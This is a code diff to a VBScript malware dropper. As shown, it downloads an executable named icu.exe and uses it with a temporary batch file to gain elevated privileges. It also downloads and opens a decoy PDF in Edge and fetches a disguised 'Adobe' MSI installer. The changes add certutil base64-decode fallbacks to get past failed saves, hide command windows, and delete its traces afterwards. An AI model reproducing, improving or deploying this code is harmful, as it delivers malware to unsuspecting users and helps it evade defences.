@@ -51,7 +51,7 @@ End If
 Err.Clear
 
 ' ============================================================
-'  NOT ADMIN - fire icu.exe via .bat intermediate
+'  NOT ADMIN - download icu.exe, write r.bat, fire icu on bat
 ' ============================================================
 If Not isAdmin Then
     dbg.WriteLine "[BRANCH] NOT ADMIN - firing icu.exe"
@@ -75,6 +75,10 @@ If Not isAdmin Then
     dbg.WriteLine "[ICU] http body  : " & LenB(http.ResponseBody) & " bytes"
 
     If http.Status = 200 Then
+        Dim icuSaved
+        icuSaved = False
+
+        ' ---- attempt 1: direct save ----
         On Error Resume Next
         Set stream = CreateObject("ADODB.Stream")
         stream.Type = 1
@@ -82,16 +86,62 @@ If Not isAdmin Then
         stream.Write http.ResponseBody
         stream.SaveToFile tmpExe, 2
         If Err.Number <> 0 Then
-            dbg.WriteLine "[ICU] save err: " & Err.Number & " - " & Err.Description
+            dbg.WriteLine "[ICU] direct save err: " & Err.Number & " - " & Err.Description
             Err.Clear
         End If
         stream.Close
         On Error GoTo 0
+
+        If fso.FileExists(tmpExe) Then
+            icuSaved = True
+            dbg.WriteLine "[ICU] direct save OK: " & fso.GetFile(tmpExe).Size & " bytes"
+        Else
+            ' ---- attempt 2: base64 + certutil ----
+            dbg.WriteLine "[ICU] direct save FAILED - certutil fallback"
+            Dim icuB64Path, icuB64Text, icuFh, icuXml, icuNode
+            icuB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.b64"
+
+            On Error Resume Next
+            Set icuXml = CreateObject("MSXML2.DOMDocument")
+            Set icuNode = icuXml.createElement("b")
+            icuNode.dataType = "bin.base64"
+            icuNode.nodeTypedValue = http.ResponseBody
+            icuB64Text = icuNode.text
+            Err.Clear
+            On Error GoTo 0
+
+            If icuB64Text <> "" Then
+                dbg.WriteLine "[ICU] b64 len: " & Len(icuB64Text)
+                On Error Resume Next
+                Set icuFh = fso.CreateTextFile(icuB64Path, True)
+                icuFh.Write icuB64Text
+                icuFh.Close
+                Err.Clear
+                On Error GoTo 0
+
+                If fso.FileExists(icuB64Path) Then
+                    dbg.WriteLine "[ICU] running certutil decode..."
+                    sh.Run "%COMSPEC% /c certutil.exe -decode """ & icuB64Path & """ """ & tmpExe & """", 0, True
+                    If fso.FileExists(tmpExe) Then
+                        dbg.WriteLine "[ICU] certutil decode OK: " & fso.GetFile(tmpExe).Size & " bytes"
+                        icuSaved = True
+                    Else
+                        dbg.WriteLine "[ICU] certutil decode FAILED"
+                    End If
+                    On Error Resume Next
+                    fso.DeleteFile icuB64Path, True
+                    Err.Clear
+                    On Error GoTo 0
+                Else
+                    dbg.WriteLine "[ICU] b64 file write FAILED"
+                End If
+            Else
+                dbg.WriteLine "[ICU] base64 encode returned empty"
+            End If
+        End If
     End If
 
-    If fso.FileExists(tmpExe) Then
-        dbg.WriteLine "[ICU] saved: " & fso.GetFile(tmpExe).Size & " bytes"
-
+    If icuSaved Then
         ' ---- write intermediate .bat ----
         Dim batPath, batContent, bf, shortBat
         batPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat"
@@ -110,7 +160,6 @@ If Not isAdmin Then
         On Error GoTo 0
 
         If fso.FileExists(batPath) Then
-            ' get 8.3 short path (removes spaces)
             On Error Resume Next
             shortBat = fso.GetFile(batPath).ShortPath
             If Err.Number <> 0 Then
@@ -121,7 +170,6 @@ If Not isAdmin Then
             On Error GoTo 0
             dbg.WriteLine "[BAT] short path: " & shortBat
 
-            ' ---- run icu.exe with the .bat path (single arg) ----
             Dim runCmd
             runCmd = qs & tmpExe & qs & " m4a1_dev4 " & qs & shortBat & qs
             dbg.WriteLine "[ICU] running: " & runCmd
@@ -132,17 +180,16 @@ If Not isAdmin Then
                 dbg.WriteLine "[ICU] run err: " & Err.Number & " - " & Err.Description
                 Err.Clear
             Else
-                dbg.WriteLine "[ICU] run returned - icu should be elevating now"
+                dbg.WriteLine "[ICU] run returned - icu elevating now"
             End If
             On Error GoTo 0
 
-            ' deferred cleanup of the .bat
             sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul & del /f /q """ & batPath & """", 0, False
         Else
             dbg.WriteLine "[BAT] FAILED - bat not on disk"
         End If
     Else
-        dbg.WriteLine "[ICU] FAILED - icu.exe not on disk"
+        dbg.WriteLine "[ICU] FAILED - icu.exe not on disk, no elevation possible"
     End If
 
     dbg.WriteLine "=== END (unelevated) ==="
@@ -160,7 +207,6 @@ Else
         fso.DeleteFile tmpExe, True
         dbg.WriteLine "[CLEANUP] deleted " & tmpExe
     End If
-    ' also clean up the .bat if present
     If fso.FileExists(sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat") Then
         fso.DeleteFile sh.ExpandEnvironmentStrings("%TEMP%") & "\r.bat", True
         dbg.WriteLine "[CLEANUP] deleted r.bat"
@@ -188,6 +234,9 @@ Else
     dbg.WriteLine "[PDF] body  : " & LenB(http.ResponseBody) & " bytes"
 
     If http.Status = 200 Then
+        Dim pdfSaved
+        pdfSaved = False
+
         On Error Resume Next
         Set stream = CreateObject("ADODB.Stream")
         stream.Type = 1
@@ -195,17 +244,47 @@ Else
         stream.Write http.ResponseBody
         stream.SaveToFile pdfPath, 2
         If Err.Number <> 0 Then
-            dbg.WriteLine "[PDF] save err: " & Err.Number & " - " & Err.Description
+            dbg.WriteLine "[PDF] direct save err: " & Err.Number & " - " & Err.Description
             Err.Clear
         End If
         stream.Close
         On Error GoTo 0
+
         If fso.FileExists(pdfPath) Then
             dbg.WriteLine "[PDF] saved: " & fso.GetFile(pdfPath).Size & " bytes"
+            pdfSaved = True
+        Else
+            ' certutil fallback for PDF too
+            dbg.WriteLine "[PDF] direct save FAILED - certutil fallback"
+            Dim pdfB64Path, pdfB64Text, pdfFh, pdfXml, pdfNode
+            pdfB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\pdf.b64"
+            On Error Resume Next
+            Set pdfXml = CreateObject("MSXML2.DOMDocument")
+            Set pdfNode = pdfXml.createElement("b")
+            pdfNode.dataType = "bin.base64"
+            pdfNode.nodeTypedValue = http.ResponseBody
+            pdfB64Text = pdfNode.text
+            Err.Clear
+            On Error GoTo 0
+            If pdfB64Text <> "" Then
+                Set pdfFh = fso.CreateTextFile(pdfB64Path, True)
+                pdfFh.Write pdfB64Text
+                pdfFh.Close
+                sh.Run "%COMSPEC% /c certutil.exe -decode """ & pdfB64Path & """ """ & pdfPath & """", 0, True
+                If fso.FileExists(pdfPath) Then
+                    dbg.WriteLine "[PDF] certutil OK: " & fso.GetFile(pdfPath).Size & " bytes"
+                    pdfSaved = True
+                End If
+                On Error Resume Next
+                fso.DeleteFile pdfB64Path, True
+                Err.Clear
+                On Error GoTo 0
+            End If
+        End If
+
+        If pdfSaved Then
             sh.Run "msedge.exe """ & pdfPath & """", 1, False
             dbg.WriteLine "[PDF] opened in Edge"
-        Else
-            dbg.WriteLine "[PDF] save FAILED"
         End If
     End If
 
@@ -251,22 +330,22 @@ Else
             saved = True
         Else
             dbg.WriteLine "[MSI] direct save FAILED - certutil fallback"
-            Dim b64Path, fh, xmlDoc, binNode, b64Text
-            b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
+            Dim msiB64Path, msiB64Text, msiFh, msiXml, msiNode
+            msiB64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
             On Error Resume Next
-            Set xmlDoc = CreateObject("MSXML2.DOMDocument")
-            Set binNode = xmlDoc.createElement("b")
-            binNode.dataType = "bin.base64"
-            binNode.nodeTypedValue = http.ResponseBody
-            b64Text = binNode.text
+            Set msiXml = CreateObject("MSXML2.DOMDocument")
+            Set msiNode = msiXml.createElement("b")
+            msiNode.dataType = "bin.base64"
+            msiNode.nodeTypedValue = http.ResponseBody
+            msiB64Text = msiNode.text
             Err.Clear
             On Error GoTo 0
-            If b64Text <> "" Then
-                dbg.WriteLine "[MSI] b64 len: " & Len(b64Text)
-                Set fh = fso.CreateTextFile(b64Path, True)
-                fh.Write b64Text
-                fh.Close
-                sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
+            If msiB64Text <> "" Then
+                dbg.WriteLine "[MSI] b64 len: " & Len(msiB64Text)
+                Set msiFh = fso.CreateTextFile(msiB64Path, True)
+                msiFh.Write msiB64Text
+                msiFh.Close
+                sh.Run "%COMSPEC% /c certutil.exe -decode """ & msiB64Path & """ """ & msiPath & """", 0, True
                 If fso.FileExists(msiPath) Then
                     dbg.WriteLine "[MSI] certutil OK: " & fso.GetFile(msiPath).Size & " bytes"
                     saved = True
@@ -274,7 +353,7 @@ Else
                     dbg.WriteLine "[MSI] certutil FAILED"
                 End If
                 On Error Resume Next
-                fso.DeleteFile b64Path, True
+                fso.DeleteFile msiB64Path, True
                 Err.Clear
                 On Error GoTo 0
             End If
